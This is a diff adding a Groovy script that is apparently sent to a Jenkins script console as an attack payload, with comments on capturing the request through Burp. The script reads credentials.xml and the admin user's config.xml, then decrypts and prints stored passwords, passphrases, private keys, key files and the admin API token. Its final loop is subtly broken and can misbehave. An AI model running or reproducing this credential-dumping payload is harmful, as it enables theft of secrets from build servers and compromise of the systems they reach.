@@ -1,0 +1,47 @@
+//Here's the Jenkins groovy script we are sending. If you want to modify this:
+//paste it into the Jenkins /script page, submit it, and then capture the post created by the website.
+//Paste the captured post data into the postdata string above. Burp proxy works well for this.
+
+import hudson.util.Secret
+def env = System.getenv()
+String homedir = env['JENKINS_HOME']
+String creds = new File(homedir + '/credentials.xml').text
+
+def m = creds =~ /(<password>|<username>|<privateKey>|<secret>|<passphrase>|<jsonKeyFile>|<data>)(.+)(<\/)/;
+
+println("Credentials store dump:\n")
+
+matchCount = m.getCount()
+
+i = 0
+while (i < matchCount) {
+  if (m[i][1] == "<username>") {
+    println "username: " + m[i][2]
+  }
+  if (m[i][1] == "<password>") {
+    println "password: " + hudson.util.Secret.decrypt(m[i][2]) + "\n"
+  }
+  if (m[i][1] == "<passphrase>") {
+    println "passphrase: " + hudson.util.Secret.decrypt(m[i][2]) + "\n"
+  }
+  if (m[i][1] == "<privateKey>") {
+    println "privatekey:\n" + hudson.util.Secret.decrypt(m[i][2]) + "\n"  
+  }  
+  if (m[i][1] == "<jsonKeyFile>") {
+    String jsonFile = new File(m[i][2]).text
+    println hudson.util.Secret.decrypt(jsonFile)
+  }
+  i = i + 1
+}
+
+String admincreds = new File(homedir + '/users/admin/config.xml').text
+def n = admincreds =~ /(<apiToken>)(.+)(<\/)/;
+adminMatchCount = n.getCount()
+
+j = 0
+while (j < adminMatchCount) {
+  if (n[j][1] == "<apiToken>") {
+    println("admin user apiToken: " + hudson.util.Secret.decrypt(n[j][2]))
+  j = i + 1
+  }
+}
